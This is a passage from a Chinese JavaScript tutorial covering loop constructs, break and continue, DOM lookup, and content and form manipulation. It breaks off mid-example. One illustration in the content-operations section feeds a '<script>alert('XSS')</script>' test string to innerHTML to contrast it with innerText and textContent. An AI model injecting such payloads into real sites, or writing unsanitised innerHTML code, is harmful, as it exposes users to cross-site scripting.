<h4 id="18-5-2-do…while循环"><a href="#18-5-2-do…while循环" class="headerlink" title="18.5.2 do…while循环"></a>18.5.2 do…while循环</h4><p><strong>详细解释：</strong></p>
<ul>
<li>先执行循环体，再判断条件</li>
<li>语法：<code>do { 循环体 } while (条件);</code></li>
<li>至少执行一次</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;当前值: &quot;</span> + i);</span><br><span class="line">    i++;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt; <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户验证</span></span><br><span class="line"><span class="keyword">var</span> password;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    password = <span class="title function_">prompt</span>(<span class="string">&quot;请输入密码（至少6位）&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (password &amp;&amp; password.<span class="property">length</span> &lt; <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理可能为空的情况</span></span><br><span class="line"><span class="keyword">var</span> data = [];</span><br><span class="line"><span class="keyword">var</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; data.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data[index]);</span><br><span class="line">    &#125;</span><br><span class="line">    index++;</span><br><span class="line">&#125; <span class="keyword">while</span> (index &lt; data.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成随机数直到满足条件</span></span><br><span class="line"><span class="keyword">var</span> random;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    random = <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(random);</span><br><span class="line">&#125; <span class="keyword">while</span> (random &lt; <span class="number">0.5</span>);</span><br></pre></td></tr></table></figure>

<h4 id="18-5-3-for循环"><a href="#18-5-3-for循环" class="headerlink" title="18.5.3 for循环"></a>18.5.3 for循环</h4><p><strong>详细解释：</strong></p>
<ul>
<li>三部分：初始化、条件、迭代</li>
<li>语法：<code>for (初始化; 条件; 迭代) { 循环体 }</code></li>
<li>最常用的循环结构</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本for循环</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;当前值: &quot;</span> + i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算阶乘</span></span><br><span class="line"><span class="keyword">var</span> n = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> factorial = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    factorial *= i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(n + <span class="string">&quot;! = &quot;</span> + factorial); <span class="comment">// 120</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历数组</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历字符串</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套循环</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">1</span>; j &lt;= <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(i + <span class="string">&quot;,&quot;</span> + j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多变量初始化</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, j = <span class="number">10</span>; i &lt; j; i++, j--) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(i + <span class="string">&quot;,&quot;</span> + j);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无限循环（谨慎使用）</span></span><br><span class="line"><span class="comment">// for (;;) &#123;</span></span><br><span class="line"><span class="comment">//     console.log(&quot;无限循环&quot;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="18-5-4-for…in循环"><a href="#18-5-4-for…in循环" class="headerlink" title="18.5.4 for…in循环"></a>18.5.4 for…in循环</h4><p><strong>详细解释：</strong></p>
<ul>
<li>遍历对象的可枚举属性</li>
<li>语法：<code>for (var key in object) { ... }</code></li>
<li>包括继承的属性，通常需要<code>hasOwnProperty</code>检查</li>
<li>不保证顺序</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 遍历对象属性</span></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">25</span>,</span><br><span class="line">    <span class="attr">city</span>: <span class="string">&quot;北京&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> person) &#123;</span><br><span class="line">    <span class="keyword">if</span> (person.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(key + <span class="string">&quot;: &quot;</span> + person[key]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历数组（不推荐，应使用for...of）</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> index <span class="keyword">in</span> arr) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(index + <span class="string">&quot;: &quot;</span> + arr[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含继承属性</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">age</span> = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> p) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key + <span class="string">&quot;: &quot;</span> + p[key]);</span><br><span class="line">    <span class="comment">// name: 李四</span></span><br><span class="line">    <span class="comment">// age: 30</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用hasOwnProperty过滤</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> p) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;自有属性: &quot;</span> + key);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;继承属性: &quot;</span> + key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="18-5-5-for…of循环（ES6-）"><a href="#18-5-5-for…of循环（ES6-）" class="headerlink" title="18.5.5 for…of循环（ES6+）"></a>18.5.5 for…of循环（ES6+）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>遍历可迭代对象（数组、字符串、Map、Set等）</li>
<li>语法：<code>for (var item of iterable) { ... }</code></li>
<li>不遍历对象属性</li>
<li>保证顺序</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 遍历数组</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> num <span class="keyword">of</span> arr) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历字符串</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> char <span class="keyword">of</span> str) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(char);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历Map</span></span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;张三&quot;</span>);</span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&quot;age&quot;</span>, <span class="number">25</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> [key, value] <span class="keyword">of</span> map) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key + <span class="string">&quot;: &quot;</span> + value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历Set</span></span><br><span class="line"><span class="keyword">var</span> set = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> item <span class="keyword">of</span> set) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(item); <span class="comment">// 1, 2, 3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与for...in对比</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span> &#125;;</span><br><span class="line"><span class="comment">// for...in遍历对象属性</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key); <span class="comment">// a, b, c</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// for...of不能直接遍历对象</span></span><br><span class="line"><span class="comment">// for (var value of obj) &#123; &#125; // 错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Object.entries遍历对象</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> [key, value] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(obj)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key + <span class="string">&quot;: &quot;</span> + value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18-6-break与continue"><a href="#18-6-break与continue" class="headerlink" title="18.6 break与continue"></a>18.6 break与continue</h3><p><strong>详细解释：</strong></p>
<ul>
<li><code>break</code>：立即终止循环</li>
<li><code>continue</code>：跳过当前迭代，继续下一次迭代</li>
<li>可用于所有循环结构</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// break示例</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i === <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(i); <span class="comment">// 0,1,2,3,4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// continue示例</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i === <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(i); <span class="comment">// 0,1,3,4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套循环中的break</span></span><br><span class="line"><span class="attr">outer</span>: <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i === <span class="number">1</span> &amp;&amp; j === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span> outer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(i + <span class="string">&quot;,&quot;</span> + j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 0,0 0,1 0,2 1,0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套循环中的continue</span></span><br><span class="line"><span class="attr">outer</span>: <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i === <span class="number">1</span> &amp;&amp; j === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span> outer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(i + <span class="string">&quot;,&quot;</span> + j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 0,0 0,1 0,2 1,0 2,0 2,1 2,2</span></span><br></pre></td></tr></table></figure>

<h2 id="19-JS操作DOM"><a href="#19-JS操作DOM" class="headerlink" title="19. JS操作DOM"></a>19. JS操作DOM</h2><h3 id="19-1-什么是DOM？"><a href="#19-1-什么是DOM？" class="headerlink" title="19.1 什么是DOM？"></a>19.1 什么是DOM？</h3><p><strong>详细解释：</strong></p>
<ul>
<li><strong>DOM</strong>（Document Object Model）：文档对象模型</li>
<li>将HTML&#x2F;XML文档表示为树形结构</li>
<li>允许JavaScript动态访问和修改文档内容</li>
<li>由W3C标准化，所有现代浏览器都支持</li>
<li>DOM树由节点组成：元素节点、属性节点、文本节点等</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DOM结构示例</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> &lt;html&gt;</span></span><br><span class="line"><span class="comment">   &lt;head&gt;</span></span><br><span class="line"><span class="comment">     &lt;title&gt;示例页面&lt;/title&gt;</span></span><br><span class="line"><span class="comment">   &lt;/head&gt;</span></span><br><span class="line"><span class="comment">   &lt;body&gt;</span></span><br><span class="line"><span class="comment">     &lt;h1&gt;标题&lt;/h1&gt;</span></span><br><span class="line"><span class="comment">     &lt;p&gt;段落文本&lt;/p&gt;</span></span><br><span class="line"><span class="comment">   &lt;/body&gt;</span></span><br><span class="line"><span class="comment"> &lt;/html&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应的DOM树</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Document</span></span><br><span class="line"><span class="comment">└── html</span></span><br><span class="line"><span class="comment">    ├── head</span></span><br><span class="line"><span class="comment">    │   └── title</span></span><br><span class="line"><span class="comment">    │       └── #text &quot;示例页面&quot;</span></span><br><span class="line"><span class="comment">    └── body</span></span><br><span class="line"><span class="comment">        ├── h1</span></span><br><span class="line"><span class="comment">        │   └── #text &quot;标题&quot;</span></span><br><span class="line"><span class="comment">        └── p</span></span><br><span class="line"><span class="comment">            └── #text &quot;段落文本&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="19-2-DOM查找元素"><a href="#19-2-DOM查找元素" class="headerlink" title="19.2 DOM查找元素"></a>19.2 DOM查找元素</h3><h4 id="19-2-1-直接查找"><a href="#19-2-1-直接查找" class="headerlink" title="19.2.1 直接查找"></a>19.2.1 直接查找</h4><p><strong>详细解释：</strong></p>
<ul>
<li>通过ID、标签名、类名等查找元素</li>
<li>返回单个元素或元素集合</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过ID获取元素（返回单个元素）</span></span><br><span class="line"><span class="keyword">var</span> header = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;header&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(header);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过标签名获取元素（返回HTMLCollection）</span></span><br><span class="line"><span class="keyword">var</span> paragraphs = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(paragraphs);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(paragraphs[<span class="number">0</span>]); <span class="comment">// 第一个p元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过类名获取元素（返回HTMLCollection）</span></span><br><span class="line"><span class="keyword">var</span> items = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;item&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(items);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过名称获取元素（返回NodeList，常用于表单元素）</span></span><br><span class="line"><span class="keyword">var</span> radios = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;option&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(radios);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过CSS选择器获取单个元素（返回第一个匹配的元素）</span></span><br><span class="line"><span class="keyword">var</span> firstItem = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.item&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(firstItem);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过CSS选择器获取所有元素（返回NodeList）</span></span><br><span class="line"><span class="keyword">var</span> allItems = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;.item&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(allItems);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：获取特定元素</span></span><br><span class="line"><span class="keyword">var</span> mainContent = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> links = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;a.external&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> activeItems = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;.item.active&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="19-2-2-间接查找"><a href="#19-2-2-间接查找" class="headerlink" title="19.2.2 间接查找"></a>19.2.2 间接查找</h4><p><strong>详细解释：</strong></p>
<ul>
<li>通过已获取的元素查找其子元素、父元素或兄弟元素</li>
<li>常用属性：<code>parentNode</code>、<code>childNodes</code>、<code>children</code>、<code>firstChild</code>、<code>lastChild</code>、<code>nextSibling</code>、<code>previousSibling</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取父元素</span></span><br><span class="line"><span class="keyword">var</span> child = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;child&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> parent = child.<span class="property">parentNode</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(parent);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取子元素</span></span><br><span class="line"><span class="keyword">var</span> parent = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;parent&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> children = parent.<span class="property">childNodes</span>; <span class="comment">// 包含文本节点</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(children);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> elementChildren = parent.<span class="property">children</span>; <span class="comment">// 只包含元素节点</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(elementChildren);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第一个/最后一个子元素</span></span><br><span class="line"><span class="keyword">var</span> firstChild = parent.<span class="property">firstElementChild</span>;</span><br><span class="line"><span class="keyword">var</span> lastChild = parent.<span class="property">lastElementChild</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(firstChild, lastChild);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取兄弟元素</span></span><br><span class="line"><span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;element&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> nextSibling = element.<span class="property">nextElementSibling</span>;</span><br><span class="line"><span class="keyword">var</span> prevSibling = element.<span class="property">previousElementSibling</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nextSibling, prevSibling);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：遍历所有子元素</span></span><br><span class="line"><span class="keyword">var</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; container.<span class="property">children</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(container.<span class="property">children</span>[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找特定类型的子元素</span></span><br><span class="line"><span class="keyword">var</span> list = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;list&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> items = list.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;li&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(items);</span><br></pre></td></tr></table></figure>

<h3 id="19-3-文件内容操作"><a href="#19-3-文件内容操作" class="headerlink" title="19.3 文件内容操作"></a>19.3 文件内容操作</h3><h4 id="19-3-1-内容操作"><a href="#19-3-1-内容操作" class="headerlink" title="19.3.1 内容操作"></a>19.3.1 内容操作</h4><p><strong>详细解释：</strong></p>
<ul>
<li><code>innerText</code>：获取或设置元素的文本内容（不包括HTML标签）</li>
<li><code>innerHTML</code>：获取或设置元素的HTML内容（包括HTML标签）</li>
<li><code>textContent</code>：类似innerText，但更标准，保留所有空白</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取内容</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">innerText</span>); <span class="comment">// 仅文本内容</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">innerHTML</span>); <span class="comment">// 包含HTML的完整内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置内容</span></span><br><span class="line">div.<span class="property">innerText</span> = <span class="string">&quot;新的文本内容&quot;</span>; <span class="comment">// 会转义HTML</span></span><br><span class="line">div.<span class="property">innerHTML</span> = <span class="string">&quot;&lt;strong&gt;新的HTML内容&lt;/strong&gt;&quot;</span>; <span class="comment">// 会解析HTML</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用textContent（更安全）</span></span><br><span class="line">div.<span class="property">textContent</span> = <span class="string">&quot;安全的内容，&lt;script&gt;不会执行&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：动态更新内容</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">updateContent</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> message = <span class="string">&quot;当前时间: &quot;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toLocaleTimeString</span>();</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;time&quot;</span>).<span class="property">innerText</span> = message;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setInterval</span>(updateContent, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：创建HTML内容</span></span><br><span class="line"><span class="keyword">var</span> list = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;list&quot;</span>);</span><br><span class="line">list.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;li&gt;项目1&lt;/li&gt;</span></span><br><span class="line"><span class="string">    &lt;li&gt;项目2&lt;/li&gt;</span></span><br><span class="line"><span class="string">    &lt;li&gt;项目3&lt;/li&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用innerText和innerHTML的差异</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">div.<span class="property">innerHTML</span> = <span class="string">&quot;&lt;p&gt;Hello&lt;/p&gt;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">innerText</span>); <span class="comment">// &quot;Hello&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">innerHTML</span>); <span class="comment">// &quot;&lt;p&gt;Hello&lt;/p&gt;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="19-3-2-表单元素操作"><a href="#19-3-2-表单元素操作" class="headerlink" title="19.3.2 表单元素操作"></a>19.3.2 表单元素操作</h4><p><strong>详细解释：</strong></p>
<ul>
<li><code>value</code>：获取或设置输入框的值</li>
<li><code>selectedIndex</code>：获取或设置下拉菜单的选中索引</li>
<li><code>checked</code>：获取或设置复选框&#x2F;单选按钮的选中状态</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输入框</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(input.<span class="property">value</span>); <span class="comment">// 获取当前值</span></span><br><span class="line">input.<span class="property">value</span> = <span class="string">&quot;新值&quot;</span>; <span class="comment">// 设置新值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 文本区域</span></span><br><span class="line"><span class="keyword">var</span> textarea = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;message&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(textarea.<span class="property">value</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下拉菜单</span></span><br><span class="line"><span class="keyword">var</span> 